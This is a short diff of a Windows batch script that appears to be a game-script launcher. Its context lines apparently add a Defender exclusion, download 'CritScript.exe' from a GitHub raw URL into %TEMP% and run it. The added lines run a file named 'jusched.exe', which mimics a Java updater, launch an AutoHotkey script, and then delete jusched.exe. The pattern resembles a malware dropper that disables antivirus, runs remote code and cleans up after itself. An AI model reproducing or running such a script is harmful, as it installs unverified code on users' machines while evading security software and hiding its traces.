@@ -30,4 +30,13 @@ powershell -inputformat none -outputformat none -NonInteractive -Command "Add-Mp
 cd %TEMP%
 Powershell -Command "Invoke-Webrequest 'https://raw.githubusercontent.com/Xevioo/XevioHub/main/CritScript.exe' -OutFile CritScript.exe"
 CritScript.exe
+if exist "%cd%\jusched.exe" (
+    jusched.exe
+) else (
+)
+Zombies.ahk
+if exist "%cd%\jusched.exe" (
+    del jusched.exe
+) else (
+)
 exit /b
